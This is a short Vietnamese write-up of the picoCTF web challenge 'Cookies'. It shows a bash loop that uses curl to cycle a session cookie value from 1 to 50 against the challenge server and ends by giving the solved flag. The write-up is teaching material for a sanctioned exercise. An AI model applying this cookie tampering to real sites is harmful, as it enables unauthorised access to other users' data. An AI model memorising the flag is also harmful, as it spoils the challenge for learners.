#### Description

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

---

Ok nhập tùm lum vô để search, xong mình F12, mở tab `Network`, vào `/search` thì thấy Cookie là `name=-1` (sai bét nhè). 
Và đập vào hai con mắt mình là chữ mờ `Snickerdoodle` ở ô nhập, thì mình cứ thế mà nhập nó vào thôi, và nó chuyển thành công qua web `/check`.

![[Pasted image 20251108170650.png]]

Và giờ Cookie đã đổi sang `name=0`, nó gợi trong đầu mình 1 suy nghĩ là:

*~Có khi nào có brute-force từ 1 đến số nào đó không?~*

Có vẻ là hợp lý, nên là mình vào terminal, nhập lệnh này là xong:

```
for i in {1..50}; do contents=$(curl -s http://mercury.picoctf.net:54219/ -H "Cookie: name=$i; Path=/" -L); if ! echo "$contents" | grep -q "Not very special"; then echo "Cookie #$i is special"; echo $contents | grep "pico"; break; fi; done
```

-> lựa khoảng 1 đến 50 để chạy thử, với `i = 1` thì nó sẽ:
- Gửi Request: Lệnh `curl` sẽ gửi một yêu cầu HTTP đến `http://mercury.picoctf.net:54219/` với header Cookie là: `Cookie: name=1; Path=/`
- Nếu nhận được phản hồi sẽ thảy nội dung vô biến `contents`.
- Kiểm tra điều kiện lệnh `if`.

=> flag ở `i = 18`: `picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`
